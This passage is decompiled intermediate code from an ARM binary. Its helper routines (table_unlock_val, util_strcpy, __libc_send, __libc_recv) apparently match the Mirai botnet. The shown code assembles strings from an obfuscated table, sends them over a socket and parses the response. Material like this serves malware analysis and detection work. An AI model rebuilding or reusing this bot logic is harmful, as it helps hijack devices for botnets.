  %v2_8a80 = add i32 %v1_8a80, %stack_var_-20860.0.ph
  store i32 %v2_8a80, i32* @r0, align 4
  %v2_8a84 = inttoptr i32 %v2_8a80 to i8*
  %v3_8a84 = call i32 @util_strcpy(i8* %v2_8a84, i32 %v3_8a74)
  store i32 34, i32* %r0.global-to-local, align 4
  %v1_8a8c = call i32 @table_lock_val(i32 34)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8a94 = call i32 @util_strlen(i8* %v1_88f0)
  store i32 %stack_var_-20860.0.ph, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b3dc.43 to i32), i32* %r1.global-to-local, align 4
  %v2_8aa0 = add i32 %v2_8a94, %stack_var_-20860.0.ph
  store i32 %v2_8aa0, i32* @r0, align 4
  %v3_8aa4 = inttoptr i32 %v2_8aa0 to i8*
  %v4_8aa4 = call i32 @util_strcpy(i8* %v3_8aa4, i32 ptrtoint ([3 x i8]* @global_var_1b3dc.43 to i32))
  store i32 %v4_8aa4, i32* %r0.global-to-local, align 4
  store i32 %v6_81fc, i32* %ip.global-to-local, align 4
  %v1_8aac = load i32, i32* %sb.global-to-local, align 4
  %v3_8aac = icmp uge i32 %v6_81fc, %v1_8aac
  store i1 %v3_8aac, i1* %cpsr_c.global-to-local, align 1
  %v9_8aac = icmp eq i32 %v6_81fc, %v1_8aac
  store i1 %v9_8aac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8aac, label %dec_label_pc_8b84, label %dec_label_pc_8ab4

dec_label_pc_8ab4:                                ; preds = %dec_label_pc_88bc
  store i32 35, i32* %r0.global-to-local, align 4
  %v1_8ab8 = call i32 @table_unlock_val(i32 35)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8ac0 = call i32 @util_strlen(i8* %v1_88f0)
  %v0_8ac4 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_8ac4, i32* %r1.global-to-local, align 4
  store i32 %v2_8ac0, i32* @r4, align 4
  store i32 35, i32* %r0.global-to-local, align 4
  %v2_8ad0 = inttoptr i32 %v0_8ac4 to i32*
  %v3_8ad0 = call i32 @table_retrieve_val(i32 35, i32* %v2_8ad0)
  store i32 %stack_var_-20860.0.ph, i32* @lr, align 4
  store i32 %v3_8ad0, i32* %r1.global-to-local, align 4
  %v1_8adc = load i32, i32* @r4, align 4
  %v2_8adc = add i32 %v1_8adc, %stack_var_-20860.0.ph
  store i32 %v2_8adc, i32* @r0, align 4
  %v2_8ae0 = inttoptr i32 %v2_8adc to i8*
  %v3_8ae0 = call i32 @util_strcpy(i8* %v2_8ae0, i32 %v3_8ad0)
  store i32 35, i32* %r0.global-to-local, align 4
  %v1_8ae8 = call i32 @table_lock_val(i32 35)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8af0 = call i32 @util_strlen(i8* %v1_88f0)
  %v2_8af8 = add i32 %v2_8af0, %stack_var_-20860.0.ph
  store i32 %v2_8af8, i32* @r0, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b3dc.43 to i32), i32* %r1.global-to-local, align 4
  %v3_8b00 = inttoptr i32 %v2_8af8 to i8*
  %v4_8b00 = call i32 @util_strcpy(i8* %v3_8b00, i32 ptrtoint ([3 x i8]* @global_var_1b3dc.43 to i32))
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8b08 = call i32 @util_strlen(i8* %v1_88f0)
  %v0_8b0c = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_8b0c, i32* %r1.global-to-local, align 4
  store i32 %v2_8b08, i32* %r4.global-to-local, align 4
  store i32 40, i32* %r0.global-to-local, align 4
  %v2_8b18 = inttoptr i32 %v0_8b0c to i32*
  %v3_8b18 = call i32 @table_retrieve_val(i32 40, i32* %v2_8b18)
  store i32 %stack_var_-20860.0.ph, i32* %r2.global-to-local, align 4
  store i32 %v3_8b18, i32* %r1.global-to-local, align 4
  %v2_8b24 = add i32 %v2_8b08, %stack_var_-20860.0.ph
  store i32 %v2_8b24, i32* @r0, align 4
  %v2_8b28 = inttoptr i32 %v2_8b24 to i8*
  %v3_8b28 = call i32 @util_strcpy(i8* %v2_8b28, i32 %v3_8b18)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8b30 = call i32 @util_strlen(i8* %v1_88f0)
  store i32 %stack_var_-20860.0.ph, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b3e0.37 to i32), i32* %r1.global-to-local, align 4
  %v2_8b3c = add i32 %v2_8b30, %stack_var_-20860.0.ph
  store i32 %v2_8b3c, i32* @r0, align 4
  %v2_8b40 = inttoptr i32 %v2_8b3c to i8*
  %v3_8b40 = call i32 @util_strcpy(i8* %v2_8b40, i32 ptrtoint (i32* @global_var_1b3e0.37 to i32))
  store i32 %v6_81fc, i32* %r0.global-to-local, align 4
  %v2_8b48 = call i32 @util_strlen(i8* %v1_8b48)
  store i32 %v2_8b48, i32* @r4, align 4
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8b54 = call i32 @util_strlen(i8* %v1_88f0)
  store i32 %stack_var_-20860.0.ph, i32* %ip.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_8b60 = add i32 %v2_8b54, %stack_var_-20860.0.ph
  store i32 %v2_8b60, i32* %r2.global-to-local, align 4
  %v0_8b64 = load i32, i32* @r4, align 4
  store i32 %v0_8b64, i32* %r0.global-to-local, align 4
  %v3_8b68 = trunc i32 %v0_8b64 to i8
  %v4_8b68 = call i32 @util_itoa(i8 %v3_8b68, i32 10, i32 %v2_8b60)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8b70 = call i32 @util_strlen(i8* %v1_88f0)
  store i32 %stack_var_-20860.0.ph, i32* @lr, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b3dc.43 to i32), i32* %r1.global-to-local, align 4
  %v2_8b7c = add i32 %v2_8b70, %stack_var_-20860.0.ph
  store i32 %v2_8b7c, i32* @r0, align 4
  %v3_8b80 = inttoptr i32 %v2_8b7c to i8*
  %v4_8b80 = call i32 @util_strcpy(i8* %v3_8b80, i32 ptrtoint ([3 x i8]* @global_var_1b3dc.43 to i32))
  store i32 %v4_8b80, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8b84

dec_label_pc_8b84:                                ; preds = %dec_label_pc_88bc, %dec_label_pc_8ab4
  %v0_8b84 = load i32, i32* @r6, align 4
  %v1_8b84 = add i32 %v0_8b84, 16
  %v2_8b84 = inttoptr i32 %v1_8b84 to i32*
  %v3_8b84 = load i32, i32* %v2_8b84, align 4
  store i32 %v3_8b84, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8b88 = icmp eq i32 %v3_8b84, 0
  store i1 %v2_8b88, i1* %cpsr_z.global-to-local, align 1
  %tmp177 = icmp slt i32 %v3_8b84, 1
  br i1 %tmp177, label %dec_label_pc_8c30, label %dec_label_pc_8b90

dec_label_pc_8b90:                                ; preds = %dec_label_pc_8b84
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8b94 = call i32 @util_strlen(i8* %v1_88f0)
  %v2_8b9c = add i32 %v2_8b94, %stack_var_-20860.0.ph
  store i32 %v2_8b9c, i32* @r0, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1b3f0.45 to i32), i32* %r1.global-to-local, align 4
  %v3_8ba4 = inttoptr i32 %v2_8b9c to i8*
  %v4_8ba4 = call i32 @util_strcpy(i8* %v3_8ba4, i32 ptrtoint ([9 x i8]* @global_var_1b3f0.45 to i32))
  store i32 %v4_8ba4, i32* %r0.global-to-local, align 4
  %v0_8ba8 = load i32, i32* @r6, align 4
  %v1_8ba8 = add i32 %v0_8ba8, 16
  %v2_8ba8 = inttoptr i32 %v1_8ba8 to i32*
  %v3_8ba8 = load i32, i32* %v2_8ba8, align 4
  store i32 %v3_8ba8, i32* %r3.global-to-local, align 4
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8bb0 = icmp eq i32 %v3_8ba8, 0
  store i1 %v2_8bb0, i1* %cpsr_z.global-to-local, align 1
  %v0_8bb4 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_8bb4, i32* %stack_var_-44, align 4
  %tmp178 = icmp slt i32 %v3_8ba8, 1
  br i1 %tmp178, label %dec_label_pc_8c18, label %dec_label_pc_8bbc

dec_label_pc_8bbc:                                ; preds = %dec_label_pc_8b90, %dec_label_pc_8bbc
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8bc0 = call i32 @util_strlen(i8* %v1_88f0)
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  %v3_8bc8 = load i32, i32* %stack_var_-44, align 4
  store i32 %stack_var_-20860.0.ph, i32* %ip.global-to-local, align 4
  %v1_8bd0 = and i32 %v3_8bc8, 33554432
  %v2_8bd0 = icmp ne i32 %v1_8bd0, 0
  store i1 %v2_8bd0, i1* %cpsr_c.global-to-local, align 1
  %v3_8bd0 = mul i32 %v3_8bc8, 128
  %v1_8bd4 = add i32 %v3_8bd0, 1472
  %v2_8bd8 = add i32 %v2_8bc0, %stack_var_-20860.0.ph
  store i32 %v2_8bd8, i32* @r0, align 4
  %v0_8bdc = load i32, i32* @r5, align 4
  %v2_8bdc = add i32 %v1_8bd4, %v0_8bdc
  store i32 %v2_8bdc, i32* %r1.global-to-local, align 4
  %v2_8be0 = inttoptr i32 %v2_8bd8 to i8*
  %v3_8be0 = call i32 @util_strcpy(i8* %v2_8be0, i32 %v2_8bdc)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8be8 = call i32 @util_strlen(i8* %v1_88f0)
  store i32 %stack_var_-20860.0.ph, i32* @lr, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b3fc.47 to i32), i32* %r1.global-to-local, align 4
  %v2_8bf4 = add i32 %v2_8be8, %stack_var_-20860.0.ph
  store i32 %v2_8bf4, i32* @r0, align 4
  %v3_8bf8 = inttoptr i32 %v2_8bf4 to i8*
  %v4_8bf8 = call i32 @util_strcpy(i8* %v3_8bf8, i32 ptrtoint ([3 x i8]* @global_var_1b3fc.47 to i32))
  store i32 %v4_8bf8, i32* %r0.global-to-local, align 4
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v3_8c00 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_8c00, i32* %r3.global-to-local, align 4
  %v0_8c04 = load i32, i32* @r6, align 4
  %v1_8c04 = add i32 %v0_8c04, 16
  %v2_8c04 = inttoptr i32 %v1_8c04 to i32*
  %v3_8c04 = load i32, i32* %v2_8c04, align 4
  store i32 %v3_8c04, i32* %r2.global-to-local, align 4
  %v1_8c08 = add i32 %v3_8c00, 1
  store i32 %v1_8c08, i32* %ip.global-to-local, align 4
  %v3_8c0c = icmp uge i32 %v3_8c04, %v1_8c08
  store i1 %v3_8c0c, i1* %cpsr_c.global-to-local, align 1
  %v9_8c0c = icmp eq i32 %v3_8c04, %v1_8c08
  store i1 %v9_8c0c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_8c08, i32* %stack_var_-44, align 4
  %v8_8c14 = icmp sgt i32 %v3_8c04, %v1_8c08
  br i1 %v8_8c14, label %dec_label_pc_8bbc, label %dec_label_pc_8c18

dec_label_pc_8c18:                                ; preds = %dec_label_pc_8bbc, %dec_label_pc_8b90
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8c1c = call i32 @util_strlen(i8* %v1_88f0)
  store i32 %stack_var_-20860.0.ph, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b3dc.43 to i32), i32* %r1.global-to-local, align 4
  %v2_8c28 = add i32 %v2_8c1c, %stack_var_-20860.0.ph
  store i32 %v2_8c28, i32* @r0, align 4
  %v3_8c2c = inttoptr i32 %v2_8c28 to i8*
  %v4_8c2c = call i32 @util_strcpy(i8* %v3_8c2c, i32 ptrtoint ([3 x i8]* @global_var_1b3dc.43 to i32))
  store i32 %v4_8c2c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8c30

dec_label_pc_8c30:                                ; preds = %dec_label_pc_8b84, %dec_label_pc_8c18
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8c34 = call i32 @util_strlen(i8* %v1_88f0)
  store i32 %stack_var_-20860.0.ph, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b3dc.43 to i32), i32* %r1.global-to-local, align 4
  %v2_8c40 = add i32 %v2_8c34, %stack_var_-20860.0.ph
  store i32 %v2_8c40, i32* @r0, align 4
  %v3_8c44 = inttoptr i32 %v2_8c40 to i8*
  %v4_8c44 = call i32 @util_strcpy(i8* %v3_8c44, i32 ptrtoint ([3 x i8]* @global_var_1b3dc.43 to i32))
  store i32 %v4_8c44, i32* %r0.global-to-local, align 4
  store i32 %v6_81fc, i32* %ip.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_8c4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8c4c, label %dec_label_pc_8c6c, label %dec_label_pc_8c54

dec_label_pc_8c54:                                ; preds = %dec_label_pc_8c30
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8c58 = call i32 @util_strlen(i8* %v1_88f0)
  store i32 %stack_var_-20860.0.ph, i32* @lr, align 4
  store i32 %v6_81fc, i32* %r1.global-to-local, align 4
  %v2_8c64 = add i32 %v2_8c58, %stack_var_-20860.0.ph
  store i32 %v2_8c64, i32* @r0, align 4
  %v2_8c68 = inttoptr i32 %v2_8c64 to i8*
  %v3_8c68 = call i32 @util_strcpy(i8* %v2_8c68, i32 %v6_81fc)
  store i32 %v3_8c68, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8c6c

dec_label_pc_8c6c:                                ; preds = %dec_label_pc_8c30, %dec_label_pc_8c54
  %v0_8c6c = load i32, i32* @r5, align 4
  %v1_8c6c = add i32 %v0_8c6c, 1440
  store i32 %v1_8c6c, i32* %r4.global-to-local, align 4
  %v0_8c70 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_8c70, i32* %r0.global-to-local, align 4
  store i32 %v1_8c6c, i32* %r1.global-to-local, align 4
  %v2_8c78 = inttoptr i32 %v0_8c70 to i8*
  %v3_8c78 = call i32 @util_strcmp(i8* %v2_8c78, i32 %v1_8c6c)
  store i32 %v3_8c78, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8c7c = icmp eq i32 %v3_8c78, 0
  store i1 %v2_8c7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8c7c, label %dec_label_pc_96bc, label %dec_label_pc_8c84

dec_label_pc_8c84:                                ; preds = %dec_label_pc_8c6c, %dec_label_pc_96bc
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v0_8c88 = load i32, i32* @r6, align 4
  %v1_8c88 = add i32 %v0_8c88, -1452
  %v2_8c88 = inttoptr i32 %v1_8c88 to i32*
  %v3_8c88 = load i32, i32* %v2_8c88, align 4
  store i32 %v3_8c88, i32* @r4, align 4
  %v2_8c8c = call i32 @util_strlen(i8* %v1_88f0)
  store i32 %stack_var_-20860.0.ph, i32* %r1.global-to-local, align 4
  store i32 %v2_8c8c, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_8c9c = load i32, i32* @r4, align 4
  store i32 %v0_8c9c, i32* %r0.global-to-local, align 4
  %v4_8ca0 = call i32 @__libc_send(i32 %v0_8c9c, i32 %stack_var_-20860.0.ph, i32 %v2_8c8c, i32 16384)
  store i32 %v4_8ca0, i32* %r0.global-to-local, align 4
  %v0_8ca4 = load i32, i32* @r6, align 4
  %v1_8ca4 = add i32 %v0_8ca4, -1452
  %v2_8ca4 = inttoptr i32 %v1_8ca4 to i32*
  %v3_8ca4 = load i32, i32* %v2_8ca4, align 4
  store i32 %v3_8ca4, i32* %ip.global-to-local, align 4
  %v3_8cac = udiv i32 %v3_8ca4, 32
  store i32 %v2_8710, i32* %r1.global-to-local, align 4
  %v3_8cb4 = mul nuw nsw i32 %v3_8cac, 4
  %v2_8cb8 = add i32 %v3_8cb4, %v2_8710
  store i32 %v2_8cb8, i32* %r2.global-to-local, align 4
  %v1_8cbc = add i32 %v2_8cb8, -164
  %v2_8cbc = inttoptr i32 %v1_8cbc to i32*
  %v3_8cbc = load i32, i32* %v2_8cbc, align 4
  %v1_8cc4 = urem i32 %v3_8ca4, 32
  store i32 %v1_8cc4, i32* %r0.global-to-local, align 4
  %v7_8cc8 = shl i32 1, %v1_8cc4
  %v8_8cc8 = or i32 %v3_8cbc, %v7_8cc8
  store i32 %v8_8cc8, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  store i32 %v8_8cc8, i32* %v2_8cbc, align 4
  %v0_8cd4 = load i32, i32* %r3.global-to-local, align 4
  %v1_8cd4 = trunc i32 %v0_8cd4 to i8
  %v2_8cd4 = load i32, i32* @r6, align 4
  %v3_8cd4 = add i32 %v2_8cd4, -1448
  %v4_8cd4 = inttoptr i32 %v3_8cd4 to i8*
  store i8 %v1_8cd4, i8* %v4_8cd4, align 1
  %v0_8cd8 = load i32, i32* %ip.global-to-local, align 4
  %v1_8cd8 = load i32, i32* @r8, align 4
  %v2_8cd8 = sub i32 %v0_8cd8, %v1_8cd8
  %v3_8cd8 = icmp uge i32 %v0_8cd8, %v1_8cd8
  store i1 %v3_8cd8, i1* %cpsr_c.global-to-local, align 1
  %v4_8cd8 = xor i32 %v1_8cd8, %v0_8cd8
  %v5_8cd8 = xor i32 %v2_8cd8, %v0_8cd8
  %v6_8cd8 = and i32 %v5_8cd8, %v4_8cd8
  %v7_8cd8 = icmp slt i32 %v6_8cd8, 0
  %v8_8cd8 = icmp slt i32 %v2_8cd8, 0
  %v9_8cd8 = icmp eq i32 %v0_8cd8, %v1_8cd8
  store i1 %v9_8cd8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_8530, i32* %r2.global-to-local, align 4
  %v3_8ce0 = xor i1 %v8_8cd8, %v7_8cd8
  %v4_8ce0 = or i1 %v9_8cd8, %v3_8ce0
  br i1 %v4_8ce0, label %bb180, label %bb179

bb179:                                            ; preds = %dec_label_pc_8c84
  %v6_8ce0 = add i32 %v0_8cd8, 1
  store i32 %v6_8ce0, i32* @r8, align 4
  br label %bb180

bb180:                                            ; preds = %dec_label_pc_8c84, %bb179
  %v1_8ce4 = load i32, i32* @r6, align 4
  %v2_8ce4 = add i32 %v1_8ce4, -1440
  %v3_8ce4 = inttoptr i32 %v2_8ce4 to i32*
  store i32 %v2_8530, i32* %v3_8ce4, align 4
  br label %dec_label_pc_85f4

dec_label_pc_8cec:                                ; preds = %dec_label_pc_85ac
  %v1_8cec = add i32 %v3_88b0, -1444
  %v2_8cec = inttoptr i32 %v1_8cec to i32*
  %v3_8cec = load i32, i32* %v2_8cec, align 4
  store i32 %v2_8530, i32* %r1.global-to-local, align 4
  %v2_8cf4 = sub i32 %v2_8530, %v3_8cec
  store i32 %v2_8cf4, i32* %r3.global-to-local, align 4
  %v2_8cf8 = icmp ugt i32 %v2_8cf4, 29
  store i1 %v2_8cf8, i1* %cpsr_c.global-to-local, align 1
  %v7_8cf8 = icmp eq i32 %v2_8cf4, 30
  store i1 %v7_8cf8, i1* %cpsr_z.global-to-local, align 1
  %v2_8cfc = xor i1 %v7_8cf8, true
  %v3_8cfc = and i1 %v2_8cf8, %v2_8cfc
  br i1 %v3_8cfc, label %dec_label_pc_85dc, label %dec_label_pc_8d00

dec_label_pc_8d00:                                ; preds = %dec_label_pc_8cec
  %v2_8d00 = inttoptr i32 %v1_8618 to i32*
  %v3_8d00 = load i32, i32* %v2_8d00, align 4
  store i32 %v3_8d00, i32* %ip.global-to-local, align 4
  %v3_8d08 = udiv i32 %v3_8d00, 32
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_8d0c = mul nuw nsw i32 %v3_8d08, 4
  store i32 %v3_8d0c, i32* %r2.global-to-local, align 4
  store i32 %v2_8710, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_8718

dec_label_pc_8d1c:                                ; preds = %dec_label_pc_85bc
  %v2_8d1c = inttoptr i32 %v1_8618 to i32*
  %v3_8d1c = load i32, i32* %v2_8d1c, align 4
  store i32 %v3_8d1c, i32* %ip.global-to-local, align 4
  %v3_8d24 = udiv i32 %v3_8d1c, 32
  store i32 %v2_8710, i32* %r3.global-to-local, align 4
  %v3_8d2c = mul nuw nsw i32 %v3_8d24, 4
  %v2_8d30 = add i32 %v3_8d2c, %v2_8710
  store i32 %v2_8d30, i32* %r2.global-to-local, align 4
  %v1_8d34 = add i32 %v2_8d30, -164
  %v2_8d34 = inttoptr i32 %v1_8d34 to i32*
  %v3_8d34 = load i32, i32* %v2_8d34, align 4
  %v1_8d38 = urem i32 %v3_8d1c, 32
  store i32 %v1_8d38, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v7_8d40 = shl i32 1, %v1_8d38
  %v8_8d40 = or i32 %v3_8d34, %v7_8d40
  store i32 %v8_8d40, i32* %r1.global-to-local, align 4
  %v1_8d44 = load i32, i32* @r8, align 4
  %v2_8d44 = sub i32 %v3_8d1c, %v1_8d44
  %v3_8d44 = icmp uge i32 %v3_8d1c, %v1_8d44
  store i1 %v3_8d44, i1* %cpsr_c.global-to-local, align 1
  %v4_8d44 = xor i32 %v1_8d44, %v3_8d1c
  %v5_8d44 = xor i32 %v2_8d44, %v3_8d1c
  %v6_8d44 = and i32 %v5_8d44, %v4_8d44
  %v7_8d44 = icmp slt i32 %v6_8d44, 0
  %v8_8d44 = icmp slt i32 %v2_8d44, 0
  %v9_8d44 = icmp eq i32 %v3_8d1c, %v1_8d44
  store i1 %v9_8d44, i1* %cpsr_z.global-to-local, align 1
  store i32 %v8_8d40, i32* %v2_8d34, align 4
  %v3_8d4c = xor i1 %v8_8d44, %v7_8d44
  %v4_8d4c = or i1 %v9_8d44, %v3_8d4c
  br i1 %v4_8d4c, label %dec_label_pc_85f4, label %dec_label_pc_8d50

dec_label_pc_8d50:                                ; preds = %dec_label_pc_8d1c
  %v0_8d50 = load i32, i32* %ip.global-to-local, align 4
  %v1_8d50 = load i32, i32* %r3.global-to-local, align 4
  %v2_8d50 = add i32 %v1_8d50, %v0_8d50
  store i32 %v2_8d50, i32* @r8, align 4
  br label %dec_label_pc_8738

dec_label_pc_8d58:                                ; preds = %dec_label_pc_87dc
  %v0_8d58 = call i32 @__GI___errno_location()
  store i32 %v0_8d58, i32* %r0.global-to-local, align 4
  %v0_8d5c = load i32, i32* @sl, align 4
  %v1_8d5c = add i32 %v0_8d5c, 660
  %v2_8d5c = inttoptr i32 %v1_8d5c to i32*
  %v3_8d5c = load i32, i32* %v2_8d5c, align 4
  store i32 %v3_8d5c, i32* @r3, align 4
  %v0_8d60 = load i32, i32* %sb.global-to-local, align 4
  %v2_8d64 = icmp ugt i32 %v3_8d5c, 1023
  store i1 %v2_8d64, i1* %cpsr_c.global-to-local, align 1
  %v7_8d64 = icmp eq i32 %v3_8d5c, 1024
  store i1 %v7_8d64, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_8d58, i32* %fp.global-to-local, align 4
  %v1_8d6c = add i32 %v0_8d60, 2116
  store i32 %v1_8d6c, i32* @r7, align 4
  br i1 %v7_8d64, label %dec_label_pc_8e70, label %dec_label_pc_8d74

dec_label_pc_8d74:                                ; preds = %dec_label_pc_8d58, %dec_label_pc_8e70, %dec_label_pc_8e64
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_8d78 = load i32, i32* %fp.global-to-local, align 4
  %v2_8d78 = inttoptr i32 %v1_8d78 to i32*
  store i32 0, i32* %v2_8d78, align 4
  %v0_8d7c = load i32, i32* @sl, align 4
  %v1_8d7c = add i32 %v0_8d7c, 660
  %v2_8d7c = inttoptr i32 %v1_8d7c to i32*
  %v3_8d7c = load i32, i32* %v2_8d7c, align 4
  store i32 %v3_8d7c, i32* %r1.global-to-local, align 4
  %v1_8d80 = add i32 %v0_8d7c, -1452
  %v2_8d80 = inttoptr i32 %v1_8d80 to i32*
  %v3_8d80 = load i32, i32* %v2_8d80, align 4
  store i32 %v3_8d80, i32* %r0.global-to-local, align 4
  %v1_8d84 = sub i32 1024, %v3_8d7c
  store i32 %v1_8d84, i32* %r2.global-to-local, align 4
  %v0_8d88 = load i32, i32* %r3.global-to-local, align 4
  %v1_8d88 = add i32 %v0_8d88, 16384
  store i32 %v1_8d88, i32* %r3.global-to-local, align 4
  %v0_8d8c = load i32, i32* @r7, align 4
  %v2_8d8c = add i32 %v0_8d8c, %v3_8d7c
  store i32 %v2_8d8c, i32* %r1.global-to-local, align 4
  %v4_8d90 = call i32 @__libc_recv(i32 %v3_8d80, i32 %v2_8d8c, i32 %v1_8d84, i32 %v1_8d88)
  store i32 %v4_8d90, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8d94 = icmp eq i32 %v4_8d90, 0
  store i1 %v2_8d94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8d94, label %dec_label_pc_96cc, label %dec_label_pc_8d9c

dec_label_pc_8d9c:                                ; preds = %dec_label_pc_8d74
  %v2_8d9c = icmp eq i32 %v4_8d90, -1
  store i1 %v2_8d9c, i1* %cpsr_c.global-to-local, align 1
  %v7_8d9c = icmp eq i32 %v4_8d90, -1
  store i1 %v7_8d9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8d9c, label %dec_label_pc_96f0, label %dec_label_pc_8da4

dec_label_pc_8da4:                                ; preds = %dec_label_pc_8d9c
  %v0_8da4 = load i32, i32* @sl, align 4
  %v1_8da4 = add i32 %v0_8da4, 660
  %v2_8da4 = inttoptr i32 %v1_8da4 to i32*
  %v3_8da4 = load i32, i32* %v2_8da4, align 4
  store i32 %v2_879c, i32* %r1.global-to-local, align 4
  %v2_8dac = add i32 %v3_8da4, %v4_8d90
  store i32 %v2_8dac, i32* @r4, align 4
  store i32 %v2_8dac, i32* %v2_8da4, align 4
  %v0_8db4 = load i32, i32* %r1.global-to-local, align 4
  %v1_8db4 = load i32, i32* @sl, align 4
  %v2_8db4 = add i32 %v1_8db4, -1444
  %v3_8db4 = inttoptr i32 %v2_8db4 to i32*
  store i32 %v0_8db4, i32* %v3_8db4, align 4
  br label %dec_label_pc_8e44

dec_label_pc_8dbc:                                ; preds = %dec_label_pc_8e44
  %v1_8dbc = inttoptr i32 %v0_8e44 to i32*
  %v2_8dbc = load i32, i32* %v1_8dbc, align 4
  store i32 %v2_8dbc, i32* @r8, align 4
  %v1_8dc0 = load i32, i32* @r4, align 4
  %v5_8dc4 = icmp slt i32 %v3_8e44, %v1_8dc0
  %storemerge49 = select i1 %v5_8dc4, i32 %v3_8e44, i32 %v1_8dc0
  store i32 %storemerge49, i32* @r6, align 4
  %v2_8dcc = sub i32 %v3_8e44, %storemerge49
  store i32 %v2_8dcc, i32* %r3.global-to-local, align 4
  %v2_8dd0 = icmp ne i32 %v2_8dbc, 0
  store i1 %v2_8dd0, i1* %cpsr_c.global-to-local, align 1
  %v7_8dd0 = icmp eq i32 %v2_8dbc, 1
  store i1 %v7_8dd0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_8dcc, i32* %v2_8e44, align 4
  br i1 %v7_8dd0, label %dec_label_pc_8e94, label %.dec_label_pc_8de0thread-pre-split_crit_edge

.dec_label_pc_8de0thread-pre-split_crit_edge:     ; preds = %dec_label_pc_8dbc
  %v1_8dd8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_8dd8, i32* @r5, align 4
  br label %dec_label_pc_8de0

dec_label_pc_8de0:                                ; preds = %dec_label_pc_8e50, %.dec_label_pc_8de0thread-pre-split_crit_edge, %dec_label_pc_8ebc
  %v0_8de0 = phi i32 [ %v3_8ebc, %dec_label_pc_8ebc ], [ %v1_8dd8, %.dec_label_pc_8de0thread-pre-split_crit_edge ], [ %v3_8e44, %dec_label_pc_8e50 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8de0 = icmp eq i32 %v0_8de0, 0
  store i1 %v2_8de0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8de0, label %dec_label_pc_8de8, label %dec_label_pc_8e08

dec_label_pc_8de8:                                ; preds = %dec_label_pc_8de0
  %v0_8de8 = load i32, i32* @sl, align 4
  %v1_8de8 = add i32 %v0_8de8, 8
  %v2_8de8 = inttoptr i32 %v1_8de8 to i32*
  %v3_8de8 = load i32, i32* %v2_8de8, align 4
  store i32 %v3_8de8, i32* @r4, align 4
  %v2_8dec = icmp ne i32 %v3_8de8, 0
  store i1 %v2_8dec, i1* %cpsr_c.global-to-local, align 1
  %v7_8dec = icmp eq i32 %v3_8de8, 1
  store i1 %v7_8dec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8dec, label %dec_label_pc_8ec4, label %dec_label_pc_8df4

dec_label_pc_8df4:                                ; preds = %dec_label_pc_8de8
  %v1_8df4 = add i32 %v0_8de8, 660
  %v2_8df4 = inttoptr i32 %v1_8df4 to i32*
  %v3_8df4 = load i32, i32* %v2_8df4, align 4
  %v0_8df8 = load i32, i32* @r6, align 4
  %v2_8df8 = sub i32 %v3_8df4, %v0_8df8
